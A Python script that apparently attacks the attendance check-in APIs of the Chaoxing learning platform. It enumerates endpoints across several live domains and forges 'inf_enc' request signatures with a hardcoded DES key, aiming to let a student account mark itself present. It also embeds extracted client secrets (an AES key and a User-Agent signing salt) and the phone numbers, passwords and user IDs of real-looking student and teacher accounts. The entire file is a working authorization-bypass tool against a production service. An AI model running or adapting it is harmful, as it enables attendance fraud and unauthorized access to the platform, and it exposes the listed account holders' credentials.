#!/usr/bin/env python3
"""
多域名签到API枚举 + inf_enc签名绕过测试
"""
import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from urllib.parse import quote, urlencode

urllib3.disable_warnings()

# ==================== 常量 ====================
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"
STU_PHONE = "18436633997"
STU_PWD = "3.1415926Cpy"
STU_PUID = "431407443"
TEA_PHONE = "19712720708"
TEA_PWD = "3.1415926Cpy"
TEA_PUID = "402644510"
DES_KEY = "Z(AfY@XS"

# ==================== 工具函数 ====================
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    r = s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                                "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                                "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                                "independentId": "0", "independentNameId": "0"},
               allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

def inf_enc_sign(params, order):
    """Generate inf_enc signature using DESKey and MD5"""
    parts = []
    for k in order:
        if k in params:
            parts.append(f"{k}={quote(str(params[k]), safe='')}")
    query = "&".join(parts) + f"&DESKey={DES_KEY}"
    return hashlib.md5(query.encode()).hexdigest()

def classify_response(data, url, role):
    """分类响应，标记关键发现"""
    markers = []
    if isinstance(data, dict):
        result = data.get("result", data.get("msg", ""))
        status_code = data.get("_raw_status", 200)
        # 检查是否成功修改
        if result == 1 or result == "1" or str(result).lower() == "success":
            if role == "student":
                markers.append("!!!CRITICAL!!!")
        # 检查是否返回了非"无权限"的有意义响应
        raw = json.dumps(data, ensure_ascii=False) if isinstance(data, dict) else str(data)
        if "无权限" not in raw and "权限" not in raw and status_code != 404:
            if result not in (0, "0", "", None) and "error" not in str(result).lower():
                if role == "student":
                    markers.append("***IMPORTANT***")
    return " ".join(markers)

def test_endpoint(session, method, url, data=None, params=None, label="", role="student"):
    """测试单个端点，返回响应数据"""
    try:
        if method == "GET":
            r = session.get(url, params=params, timeout=15, allow_redirects=False)
        else:
            r = session.post(url, data=data, timeout=15, allow_redirects=False)
        d = safe_json(r)
        markers = classify_response(d, url, role)
        status = r.status_code
        result_val = d.get("result", d.get("msg", "N/A")) if isinstance(d, dict) else "N/A"
        msg_val = d.get("msg", d.get("message", "")) if isinstance(d, dict) else ""
        print(f"  [{method}] {label}")
        print(f"    URL: {url[:120]}")
        print(f"    Status: {status} | result: {result_val} | msg: {msg_val}")
        if markers:
            print(f"    {markers}")
        # 如果响应简短，打印完整内容
        raw_text = r.text[:300] if len(r.text) <= 300 else r.text[:200] + "..."
        if status != 404 and raw_text.strip():
            print(f"    Body: {raw_text}")
        return d, status
    except Exception as e:
        print(f"  [{method}] {label}")
        print(f"    URL: {url[:120]}")
        print(f"    ERROR: {str(e)[:200]}")
        return None, 0

# ==================== 主逻辑 ====================
def main():
    results = []  # 收集所有结果用于汇总表

    print("=" * 80)
    print("  多域名签到API枚举 + inf_enc签名绕过测试")
    print("=" * 80)

    # ---------- 登录 ----------
    print("\n[登录] 学生账号登录...")
    stu_session, stu_puid = login(STU_PHONE, STU_PWD)
    print(f"  学生PUID: {stu_puid or '未获取'}")

    print("[登录] 教师账号登录...")
    tea_session, tea_puid = login(TEA_PHONE, TEA_PWD)
    print(f"  教师PUID: {tea_puid or '未获取'}")

    if not stu_puid or not tea_puid:
        print("!!! 登录失败，终止测试 !!!")
        sys.exit(1)

    # ============================================================
    # Part 1: 多域名签到API枚举
    # ============================================================
    print("\n" + "=" * 80)
    print("  Part 1: 多域名签到API枚举")
    print("=" * 80)

    # --- Domain 1: mooc1-api.chaoxing.com ---
    print("\n" + "-" * 60)
    print("  Domain 1: mooc1-api.chaoxing.com")
    print("-" * 60)

    mooc1_api_endpoints = [
        # (method, path, type, description)
        ("POST", "/qr/updateqrstatus", "form", "QR签到POST(form)"),
        ("GET",  f"/qr/updateqrstatus?uuid2=test&clazzId2={CLASS_ID}", "url", "QR签到GET(URL params)"),
        ("GET",  "/mooc-ans/qr/updateqrstatus", "url", "QR签到(mooc-ans前缀)"),
        ("GET",  "/mooc-ans/qr/produce", "url", "QR生成"),
        ("GET",  "/mooc-ans/qr/getqrstatus", "url", "QR状态查询"),
        ("GET",  "/mooc-ans/facephoto/clientfacecheckstatus", "url", "人脸检测状态"),
        ("POST", "/mooc-ans/pptSign/updateSignStatusByUidsV2", "form", "PPT签到V2(mooc-ans)"),
        ("POST", "/mooc-ans/pptSign/stuSignajax", "form", "学生签到ajax(mooc-ans)"),
        ("POST", "/mooc-ans/pptSign/updateqrstatus", "form", "PPT-QR签到(mooc-ans)"),
        ("POST", "/mooc-ans/newsign/updateSignStatus", "form", "新签到(mooc-ans)"),
        ("POST", "/mooc-ans/sign/updateSignStatus", "form", "签到更新(mooc-ans)"),
        ("POST", "/mooc-ans/sign/signIn", "form", "签到(mooc-ans)"),
        ("POST", "/mooc-ans/widget/sign/pcTeaSignController/updateSignStatus2", "form", "PC教师签到(mooc-ans)"),
        ("POST", "/pptSign/updateSignStatusByUidsV2", "form", "PPT签到V2"),
        ("POST", "/pptSign/stuSignajax", "form", "学生签到ajax"),
        ("POST", "/newsign/updateSignStatus", "form", "新签到"),
    ]

    base_form = {
        "activeId": ACTIVE_ID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "uid": STU_PUID,
    }

    qr_form = {
        "clazzId": CLASS_ID,
        "courseId": COURSE_ID,
        "uuid": "test",
        "qrcEnc": "test",
        "cpi": "test",
        "objectId": "test",
        "liveDetectionStatus": "0",
        "signt": "",
        "signk": "",
        "cxtime": "",
        "cxcid": "",
        "knowledgeid": "0",
    }

    for method, path, etype, desc in mooc1_api_endpoints:
        url = f"https://mooc1-api.chaoxing.com{path}"
        for role, session, puid, role_label in [
            ("student", stu_session, STU_PUID, "学生"),
            ("teacher", tea_session, TEA_PUID, "教师"),
        ]:
            label = f"[mooc1-api] {desc} ({role_label})"
            if etype == "form":
                if "qr" in path.lower() and "pptSign" not in path.lower():
                    form_data = dict(qr_form)
                    form_data["uid"] = puid
                else:
                    form_data = dict(base_form)
                    form_data["uid"] = puid
                    form_data["status"] = "1"
                d, sc = test_endpoint(session, method, url, data=form_data, label=label, role=role)
            else:
                params = {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
                d, sc = test_endpoint(session, method, url, params=params, label=label, role=role)
            results.append(("mooc1-api.chaoxing.com", path, method, role, sc, d))

    # --- Domain 2: mooc1.chaoxing.com ---
    print("\n" + "-" * 60)
    print("  Domain 2: mooc1.chaoxing.com")
    print("-" * 60)

    mooc1_endpoints = [
        ("GET",  "/mooc-ans/qr/produce", "url", "QR生成"),
        ("GET",  "/mooc-ans/qr/getqrstatus", "url", "QR状态查询"),
        ("POST", "/mooc-ans/pptSign/updateSignStatusByUidsV2", "form", "PPT签到V2"),
        ("POST", "/mooc-ans/newsign/updateSignStatus", "form", "新签到"),
        ("GET",  "/mooc-ans/facephoto/clientfacecheckstatus", "url", "人脸检测状态"),
        ("POST", "/mooc-ans/widget/sign/pcTeaSignController/updateSignStatus2", "form", "PC教师签到"),
    ]

    for method, path, etype, desc in mooc1_endpoints:
        url = f"https://mooc1.chaoxing.com{path}"
        for role, session, puid, role_label in [
            ("student", stu_session, STU_PUID, "学生"),
            ("teacher", tea_session, TEA_PUID, "教师"),
        ]:
            label = f"[mooc1] {desc} ({role_label})"
            if etype == "form":
                form_data = dict(base_form)
                form_data["uid"] = puid
                form_data["status"] = "1"
                d, sc = test_endpoint(session, method, url, data=form_data, label=label, role=role)
            else:
                params = {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
                d, sc = test_endpoint(session, method, url, params=params, label=label, role=role)
            results.append(("mooc1.chaoxing.com", path, method, role, sc, d))

    # --- Domain 3: mooc2-ans.chaoxing.com ---
    print("\n" + "-" * 60)
    print("  Domain 3: mooc2-ans.chaoxing.com")
    print("-" * 60)

    mooc2_endpoints = [
        ("POST", "/pptSign/updateSignStatusByUidsV2", "form", "PPT签到V2"),
        ("POST", "/newsign/updateSignStatus", "form", "新签到"),
        ("POST", "/sign/updateSignStatus", "form", "签到更新"),
        ("POST", "/qr/updateqrstatus", "form", "QR签到"),
    ]

    for method, path, etype, desc in mooc2_endpoints:
        url = f"https://mooc2-ans.chaoxing.com{path}"
        for role, session, puid, role_label in [
            ("student", stu_session, STU_PUID, "学生"),
            ("teacher", tea_session, TEA_PUID, "教师"),
        ]:
            label = f"[mooc2-ans] {desc} ({role_label})"
            if etype == "form":
                if "qr" in path.lower():
                    form_data = dict(qr_form)
                    form_data["uid"] = puid
                else:
                    form_data = dict(base_form)
                    form_data["uid"] = puid
                    form_data["status"] = "1"
                d, sc = test_endpoint(session, method, url, data=form_data, label=label, role=role)
            else:
                params = {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
                d, sc = test_endpoint(session, method, url, params=params, label=label, role=role)
            results.append(("mooc2-ans.chaoxing.com", path, method, role, sc, d))

    # --- Domain 4: mobilelearn.chaoxing.com (baseline) ---
    print("\n" + "-" * 60)
    print("  Domain 4: mobilelearn.chaoxing.com (基线对照)")
    print("-" * 60)

    for role, session, puid, role_label in [
        ("student", stu_session, STU_PUID, "学生"),
        ("teacher", tea_session, TEA_PUID, "教师"),
    ]:
        url = "https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2"
        form_data = dict(base_form)
        form_data["uid"] = puid
        form_data["status"] = "1"
        label = f"[mobilelearn] PPT签到V2 ({role_label})"
        d, sc = test_endpoint(session, "POST", url, data=form_data, label=label, role=role)
        results.append(("mobilelearn.chaoxing.com", "/pptSign/updateSignStatusByUidsV2", "POST", role, sc, d))

    # ============================================================
    # Part 2: inf_enc签名绕过测试
    # ============================================================
    print("\n" + "=" * 80)
    print("  Part 2: inf_enc签名绕过测试")
    print("=" * 80)

    # --- 2.1: updateSignStatusByUidsV2 + inf_enc ---
    print("\n--- 2.1: updateSignStatusByUidsV2 + inf_enc ---")
    params_v2 = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STU_PUID,
        "status": "1",
        "remark": "",
    }
    order_v2 = ["DB_STRATEGY", "STRATEGY_PARA", "activeId", "uids", "status", "remark"]
    sig_v2 = inf_enc_sign(params_v2, order_v2)
    print(f"  inf_enc签名: {sig_v2}")

    inf_enc_targets_v2 = [
        ("mobilelearn.chaoxing.com", "/pptSign/updateSignStatusByUidsV2"),
        ("mooc1-api.chaoxing.com", "/pptSign/updateSignStatusByUidsV2"),
        ("mooc1-api.chaoxing.com", "/mooc-ans/pptSign/updateSignStatusByUidsV2"),
        ("mooc2-ans.chaoxing.com", "/pptSign/updateSignStatusByUidsV2"),
    ]

    for domain, path in inf_enc_targets_v2:
        # 带inf_enc签名
        url_with_sig = f"https://{domain}{path}?{urlencode(params_v2)}&inf_enc={sig_v2}"
        label = f"[+inf_enc] {domain}{path} (学生)"
        d, sc = test_endpoint(stu_session, "POST", url_with_sig, label=label, role="student")
        results.append((domain, f"{path}+inf_enc", "POST", "student", sc, d))

        # 不带inf_enc签名（对照）
        url_no_sig = f"https://{domain}{path}?{urlencode(params_v2)}"
        label = f"[-inf_enc] {domain}{path} (学生)"
        d, sc = test_endpoint(stu_session, "POST", url_no_sig, label=label, role="student")
        results.append((domain, f"{path}-inf_enc", "POST", "student", sc, d))

    # --- 2.2: newsign/updateSignStatus + inf_enc ---
    print("\n--- 2.2: newsign/updateSignStatus + inf_enc ---")
    params_newsign = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STU_PUID,
        "status": "1",
        "remark": "",
        "classId": CLASS_ID,
        "courseId": COURSE_ID,
        "uid": STU_PUID,
    }
    order_newsign = ["DB_STRATEGY", "STRATEGY_PARA", "activeId", "uids", "status", "remark", "classId", "courseId", "uid"]
    sig_newsign = inf_enc_sign(params_newsign, order_newsign)
    print(f"  inf_enc签名: {sig_newsign}")

    inf_enc_targets_newsign = [
        ("mooc1-api.chaoxing.com", "/mooc-ans/newsign/updateSignStatus"),
        ("mooc1-api.chaoxing.com", "/newsign/updateSignStatus"),
        ("mooc1.chaoxing.com", "/mooc-ans/newsign/updateSignStatus"),
        ("mooc2-ans.chaoxing.com", "/newsign/updateSignStatus"),
    ]

    for domain, path in inf_enc_targets_newsign:
        # 带inf_enc签名
        url_with_sig = f"https://{domain}{path}?{urlencode(params_newsign)}&inf_enc={sig_newsign}"
        label = f"[+inf_enc] {domain}{path} (学生)"
        d, sc = test_endpoint(stu_session, "POST", url_with_sig, label=label, role="student")
        results.append((domain, f"{path}+inf_enc", "POST", "student", sc, d))

        # 不带inf_enc签名（对照）
        url_no_sig = f"https://{domain}{path}?{urlencode(params_newsign)}"
        label = f"[-inf_enc] {domain}{path} (学生)"
        d, sc = test_endpoint(stu_session, "POST", url_no_sig, label=label, role="student")
        results.append((domain, f"{path}-inf_enc", "POST", "student", sc, d))

    # --- 2.3: 教师用inf_enc测试updateSignStatusByUidsV2 ---
    print("\n--- 2.3: 教师用inf_enc测试updateSignStatusByUidsV2 ---")
    params_v2_tea = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STU_PUID,
        "status": "1",
        "remark": "",
    }
    sig_v2_tea = inf_enc_sign(params_v2_tea, order_v2)
    for domain, path in inf_enc_targets_v2:
        url_with_sig = f"https://{domain}{path}?{urlencode(params_v2_tea)}&inf_enc={sig_v2_tea}"
        label = f"[+inf_enc] {domain}{path} (教师)"
        d, sc = test_endpoint(tea_session, "POST", url_with_sig, label=label, role="teacher")
        results.append((domain, f"{path}+inf_enc", "POST", "teacher", sc, d))

    # ============================================================
    # Part 3: /qr/updateqrstatus 深度测试
    # ============================================================
    print("\n" + "=" * 80)
    print("  Part 3: /qr/updateqrstatus 深度测试")
    print("=" * 80)

    # 3.1 学生POST完整参数
    print("\n--- 3.1: 学生POST完整QR参数 ---")
    url = "https://mooc1-api.chaoxing.com/qr/updateqrstatus"
    form = dict(qr_form)
    form["uid"] = STU_PUID
    d, sc = test_endpoint(stu_session, "POST", url, data=form, label="[mooc1-api] QR签到POST完整参数(学生)", role="student")
    results.append(("mooc1-api.chaoxing.com", "/qr/updateqrstatus-POST-full", "POST", "student", sc, d))

    # 3.2 学生GET URL参数
    print("\n--- 3.2: 学生GET URL参数 ---")
    url = f"https://mooc1-api.chaoxing.com/qr/updateqrstatus?uuid2=test&clazzId2={CLASS_ID}"
    d, sc = test_endpoint(stu_session, "GET", url, label="[mooc1-api] QR签到GET(学生)", role="student")
    results.append(("mooc1-api.chaoxing.com", "/qr/updateqrstatus-GET", "GET", "student", sc, d))

    # 3.3 空qrcEnc
    print("\n--- 3.3: 空qrcEnc ---")
    form_empty = dict(qr_form)
    form_empty["uid"] = STU_PUID
    form_empty["qrcEnc"] = ""
    d, sc = test_endpoint(stu_session, "POST", url, data=form_empty, label="[mooc1-api] QR签到空qrcEnc(学生)", role="student")
    results.append(("mooc1-api.chaoxing.com", "/qr/updateqrstatus-POST-empty-qrcEnc", "POST", "student", sc, d))

    # 3.4 无qrcEnc参数
    print("\n--- 3.4: 无qrcEnc参数 ---")
    form_no_qrc = dict(qr_form)
    form_no_qrc["uid"] = STU_PUID
    del form_no_qrc["qrcEnc"]
    d, sc = test_endpoint(stu_session, "POST", url, data=form_no_qrc, label="[mooc1-api] QR签到无qrcEnc(学生)", role="student")
    results.append(("mooc1-api.chaoxing.com", "/qr/updateqrstatus-POST-no-qrcEnc", "POST", "student", sc, d))

    # 3.5 带activeId参数
    print("\n--- 3.5: 带activeId参数 ---")
    form_active = dict(qr_form)
    form_active["uid"] = STU_PUID
    form_active["activeId"] = ACTIVE_ID
    d, sc = test_endpoint(stu_session, "POST", url, data=form_active, label="[mooc1-api] QR签到带activeId(学生)", role="student")
    results.append(("mooc1-api.chaoxing.com", "/qr/updateqrstatus-POST-with-activeId", "POST", "student", sc, d))

    # 3.6 教师POST完整参数
    print("\n--- 3.6: 教师POST完整QR参数 ---")
    form_tea = dict(qr_form)
    form_tea["uid"] = TEA_PUID
    d, sc = test_endpoint(tea_session, "POST", url, data=form_tea, label="[mooc1-api] QR签到POST完整参数(教师)", role="teacher")
    results.append(("mooc1-api.chaoxing.com", "/qr/updateqrstatus-POST-full", "POST", "teacher", sc, d))

    # 3.7 mooc-ans前缀的QR端点
    print("\n--- 3.7: mooc-ans前缀QR端点 ---")
    url_moocans = "https://mooc1-api.chaoxing.com/mooc-ans/qr/updateqrstatus"
    form_moocans = dict(qr_form)
    form_moocans["uid"] = STU_PUID
    d, sc = test_endpoint(stu_session, "POST", url_moocans, data=form_moocans, label="[mooc1-api/mooc-ans] QR签到POST(学生)", role="student")
    results.append(("mooc1-api.chaoxing.com", "/mooc-ans/qr/updateqrstatus-POST", "POST", "student", sc, d))

    # 3.8 mooc1域名QR端点
    print("\n--- 3.8: mooc1域名QR端点 ---")
    url_mooc1 = "https://mooc1.chaoxing.com/mooc-ans/qr/updateqrstatus"
    form_mooc1 = dict(qr_form)
    form_mooc1["uid"] = STU_PUID
    d, sc = test_endpoint(stu_session, "POST", url_mooc1, data=form_mooc1, label="[mooc1] QR签到POST(学生)", role="student")
    results.append(("mooc1.chaoxing.com", "/mooc-ans/qr/updateqrstatus-POST", "POST", "student", sc, d))

    # ============================================================
    # Part 4: 数据修改验证
    # ============================================================
    print("\n" + "=" * 80)
    print("  Part 4: 数据修改验证（对可疑成功响应进行前后对比）")
    print("=" * 80)

    # 查找所有学生端返回了非错误响应的端点
    suspicious = []
    for domain, path, method, role, sc, d in results:
        if role != "student":
            continue
        if d is None or sc == 0:
            continue
        if isinstance(d, dict):
            result = d.get("result", d.get("msg", ""))
            if result == 1 or result == "1" or str(result).lower() == "success":
                suspicious.append((domain, path, method, sc, d))

    if suspicious:
        print(f"\n  发现 {len(suspicious)} 个可疑成功响应，进行前后对比验证...")
        for domain, path, method, sc, d in suspicious:
            print(f"\n  验证: {domain}{path}")
            # 修改前查询
            v2_url = f"https://mobilelearn.chaoxing.com/v2/apis/sign/signIn?activeId={ACTIVE_ID}&uid={STU_PUID}"
            try:
                r_before = stu_session.get(v2_url, timeout=15)
                before_data = safe_json(r_before)
                before_status = get_status(before_data)
                print(f"    修改前状态: {before_status}")
            except Exception as e:
                before_status = None
                print(f"    修改前查询失败: {e}")

            # 执行修改请求
            if method == "POST":
                full_url = f"https://{domain}{path.split('?')[0]}"
                form_data = dict(base_form)
                form_data["uid"] = STU_PUID
                form_data["status"] = "1"
                try:
                    r_mod = stu_session.post(full_url, data=form_data, timeout=15)
                    mod_data = safe_json(r_mod)
                    print(f"    修改请求结果: result={mod_data.get('result', 'N/A')}, msg={mod_data.get('msg', '')}")
                except Exception as e:
                    print(f"    修改请求失败: {e}")

            # 等待2秒
            time.sleep(2)

            # 修改后查询
            try:
                r_after = stu_session.get(v2_url, timeout=15)
                after_data = safe_json(r_after)
                after_status = get_status(after_data)
                print(f"    修改后状态: {after_status}")
            except Exception as e:
                after_status = None
                print(f"    修改后查询失败: {e}")

            # 对比
            if before_status != after_status and after_status is not None:
                print(f"    !!!CRITICAL!!! 状态发生变化: {before_status} -> {after_status}")
            else:
                print(f"    状态未变化 (前后一致: {before_status})")
    else:
        print("  未发现可疑成功响应，跳过前后对比验证。")

    # ============================================================
    # 综合汇总表
    # ============================================================
    print("\n" + "=" * 80)
    print("  综合汇总表")
    print("=" * 80)
    print(f"{'域名':<30} {'路径':<55} {'方法':<6} {'角色':<6} {'HTTP状态':<8} {'结果'}")
    print("-" * 130)

    for domain, path, method, role, sc, d in results:
        if d is None:
            result_str = "请求失败"
        elif isinstance(d, dict):
            r = d.get("result", d.get("msg", ""))
            m = d.get("msg", d.get("message", ""))
            result_str = f"result={r}"
            if m:
                result_str += f" msg={m}" if len(str(m)) < 40 else f" msg={str(m)[:37]}..."
        else:
            result_str = str(d)[:50]

        # 标记
        marker = ""
        if role == "student" and isinstance(d, dict):
            r = d.get("result", d.get("msg", ""))
            if r == 1 or r == "1" or str(r).lower() == "success":
                marker = " !!!CRITICAL!!!"
            elif sc != 404 and r not in (0, "0", "", None) and "无权限" not in json.dumps(d, ensure_ascii=False):
                marker = " ***IMPORTANT***"

        # <<NEW>> 标记: 新域名上存在的端点
        new_marker = ""
        if sc != 0 and sc != 404 and domain not in ("mobilelearn.chaoxing.com",):
            new_marker = " <<NEW>>"

        path_display = path[:53]
        print(f"{domain:<30} {path_display:<55} {method:<6} {role:<6} {sc:<8} {result_str}{marker}{new_marker}")

    print("\n" + "=" * 80)
    print("  测试完成")
    print("=" * 80)

if __name__ == "__main__":
    main()
